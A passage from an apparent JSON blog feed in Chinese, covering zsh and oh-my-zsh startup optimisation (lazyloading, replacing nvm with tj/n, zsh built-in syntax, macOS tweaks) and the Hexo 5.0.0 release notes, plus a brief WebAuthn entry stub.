lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]